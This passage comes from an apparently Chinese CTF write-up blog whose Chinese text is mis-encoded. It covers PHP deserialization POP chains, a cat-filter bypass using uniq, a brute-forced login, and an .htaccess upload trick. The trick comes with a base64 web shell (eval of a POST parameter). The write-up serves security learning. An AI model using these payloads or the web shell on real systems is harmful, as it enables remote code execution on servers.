<p>è¯´æ˜ï¼š<br>passwordå‚æ•°çš„è¦æ±‚ï¼šmd5åŠ å¯†åå‰å…­ä½è¦æ»¡è¶³c4d038<br>e_v.a.lå‚æ•°éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š<br>åœ¨POSTçš„æ—¶å€™e_v.a.lä¸­çš„.ä¼šè¢«è§£æä¸º_<br>ç»•è¿‡æ–¹å¼ï¼š<br>e[v.a.l<br>è¿™æ ·[ ä¼šè¢«è§£ææˆ_ è€Œåé¢çš„é€—å·ä¸ä¼šè¢«è§£æ</p>
<h3 id="28ã€-NewStarCTF-2023-å…¬å¼€èµ›é“-Unserializeï¼Ÿ"><a href="#28ã€-NewStarCTF-2023-å…¬å¼€èµ›é“-Unserializeï¼Ÿ" class="headerlink" title="28ã€[NewStarCTF 2023 å…¬å¼€èµ›é“]Unserializeï¼Ÿ"></a>28ã€[NewStarCTF 2023 å…¬å¼€èµ›é“]Unserializeï¼Ÿ</h3><p>é¢˜ç›®æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>æµ‹è¯•è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;ls /&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>()<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(a))<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å› ä¸ºcatè¢«å±è”½äº† ä½¿ç”¨uniqå¯ä»¥ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;uniq /th1s_1s_fffflllll4444aaaggggg&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>()<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(a))<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="29ã€-NewStarCTF-2023-å…¬å¼€èµ›é“-POP-Gadget"><a href="#29ã€-NewStarCTF-2023-å…¬å¼€èµ›é“-POP-Gadget" class="headerlink" title="29ã€[NewStarCTF 2023 å…¬å¼€èµ›é“]POP Gadget"></a>29ã€[NewStarCTF 2023 å…¬å¼€èµ›é“]POP Gadget</h3><p>é¢˜ç›®æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br></code></pre></td></tr></table></figure>

<p>è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br><br>        &#125;<br><br>    &#125;<br><br>&#125;<br><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br><br>        <span class="hljs-variable language_">$this</span>-&gt;func=<span class="hljs-variable">$a</span>;<br><br>    &#125;<span class="hljs-comment">//æ„é€ ä¸€ä¸ªæ„é€ æ–¹æ³• æ¥è¿›è¡Œè§¦å‘Superé‡Œé¢çš„__invoke()é­”æœ¯æ–¹æ³•  å› ä¸ºprivateï¼ˆï¼‰å‡½æ•°åŸå›  ç±»çš„å†…éƒ¨èƒ½å¤Ÿè®¿é—® ä½†å¤–éƒ¨ä¸èƒ½è®¿é—®</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br><br>    &#125;<br><br><br><br>&#125;<br><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br><br>    &#125;<span class="hljs-comment">//æ„é€ ä¸€ä¸ªæ„é€ æ–¹æ³• è¿›å…¥CTFçš„å†…éƒ¨ å› ä¸ºprotectedï¼ˆï¼‰å‡½æ•°åŸå›  å­ç±»èƒ½å¤Ÿè®¿é—® ä½†å¤–éƒ¨ä¸èƒ½è®¿é—®</span><br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br><br>    &#125;<br><br><br><br>&#125;<br><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br><br>    &#125; <span class="hljs-comment">//æ„é€ ä¸€ä¸ªæ„é€ æ–¹æ³• æ¥è¿›è¡Œè§¦å‘Handleé‡Œé¢çš„__callï¼ˆï¼‰é­”æœ¯æ–¹æ³•  å› ä¸ºprotectedï¼ˆï¼‰å‡½æ•°åŸå›  å­ç±»èƒ½å¤Ÿè®¿é—® ä½†å¤–éƒ¨ä¸èƒ½è®¿é—®</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br><br>    &#125;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br><br>    &#125;<br><br>&#125;<br><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br><br>        <span class="hljs-variable language_">$this</span>-&gt;handle=<span class="hljs-variable">$b</span>;<br><br>    &#125;    <span class="hljs-comment">//è‡ªå·±åˆ›å»ºæ„é€ å‡½æ•° æ¥è§¦å‘ä¸‹é¢çš„__unset()é­”æœ¯æ–¹æ³•</span><br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br><br>    &#125;<br><br><br><br>&#125;<br><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;system&#x27;</span>; <span class="hljs-comment">//èµ‹å€¼æ¥æ„é€ å‘½ä»¤æ‰§è¡Œ</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;ls /&#x27;</span>;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">    </span>&#123;<br><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>); <span class="hljs-comment">//å‡ºå£å‡½æ•° é‡‡ç”¨ä¼ å‚çš„æ‹¼æ¥ å¯ä»¥æ‰§è¡Œå‘½ä»¤æ‰§è¡Œæ¼æ´</span><br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//popé“¾ï¼š__construct()-&gt;__tostringï¼ˆï¼‰-&gt;__invoke()-&gt;__callï¼ˆï¼‰-&gt;CTF()-&gt;__unset</span><br><br><br><br><span class="hljs-variable">$k</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>(); <span class="hljs-comment">//åˆ›å»ºå¯¹è±¡è‡ªåŠ¨é”€æ¯è§¦å‘__construct()é­”æœ¯æ–¹æ³•</span><br><br><span class="hljs-variable">$k</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>(); <span class="hljs-comment">//è§¦å‘__tostringï¼ˆï¼‰é­”æœ¯æ–¹æ³•</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$k</span>)); <span class="hljs-comment">//urlç¼–ç å¯ä»¥ç»•è¿‡ç§æœ‰å±æ€§å’Œä¿æŠ¤å±æ€§ æˆ–è€…é‡‡ç”¨%00æ¥æ›¿è¡¥</span><br></code></pre></td></tr></table></figure>

<p>æœ€ç»ˆpayload POSTæ–¹æ³•æäº¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>

<h3 id="30ã€-NewStarCTF-2023-å…¬å¼€èµ›é“-EasyLogin"><a href="#30ã€-NewStarCTF-2023-å…¬å¼€èµ›é“-EasyLogin" class="headerlink" title="30ã€[NewStarCTF 2023 å…¬å¼€èµ›é“]EasyLogin"></a>30ã€[NewStarCTF 2023 å…¬å¼€èµ›é“]EasyLogin</h3><p>çˆ†ç ´å¯†ç åå¾—åˆ°å¯†ç æ˜¯000000<br>admin 000000 ç™»é™†æˆåŠŸ<br>æŠ“åŒ…åå‘ç°302é‡å®šå‘é¡µé¢<br>åœ¨è¯¥é¡µé¢å‘ç°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HTTP/1.1 302 Found<br>Date: Wed, 31 Jan 2024 02:52:10 GMT<br>Server: Apache/2.4.54 (Debian)<br>X-Powered-By: PHP/7.4.30<br>Set-Cookie: token=vyYcoj3oBPxcJynYjDB147AXacdZmh0kgkqJO9WvoHJ1aQtYOHBXIFfl1UbeoQucH6MgN5teTRk2ndV3Mwp0Ng%3D%3D; path=/<br>Location: /<br>Content-Length: 51<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br><br>&lt;!-- flag&#123;80287908-f5bc-44d8-aa80-3ec4ea9e331f&#125; --&gt;<br></code></pre></td></tr></table></figure>

<h3 id="31ã€-Dest0g3-520è¿æ–°èµ›-funny-upload"><a href="#31ã€-Dest0g3-520è¿æ–°èµ›-funny-upload" class="headerlink" title="31ã€[Dest0g3 520è¿æ–°èµ›]funny_upload"></a>31ã€[Dest0g3 520è¿æ–°èµ›]funny_upload</h3><p>.htaccess æ³¨æ„ä¸Šä¼ çš„æ—¶å€™å…ˆä¸Šä¼ .htaccess.jpg å†æŠ“åŒ…ä¿®æ”¹åç§°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">AddType application/x-httpd-php .jpg<br>php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=1.jpg&quot;<br></code></pre></td></tr></table></figure>

<p>1.jpg</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PD9waHAgZXZhbCgkX1BPU1RbJ25lbmUnXSk7Pz4=<br># &lt;?php eval($_POST[&#x27;nene&#x27;]);?&gt;<br></code></pre></td></tr></table></figure>

<p>ä¹‹åèšå‰‘è¿æ¥å³å¯</p>
<h3 id="32ã€-Dest0g3-520è¿æ–°èµ›-SimpleRCE"><a href="#32ã€-Dest0g3-520è¿æ–°èµ›-SimpleRCE" class="headerlink" title="32ã€[Dest0g3 520è¿æ–°èµ›]SimpleRCE"></a>32ã€[Dest0g3 520è¿æ–°èµ›]SimpleRCE</h3><p>æ— å‚æ•°rceç›´æ¥è¿‡</p>
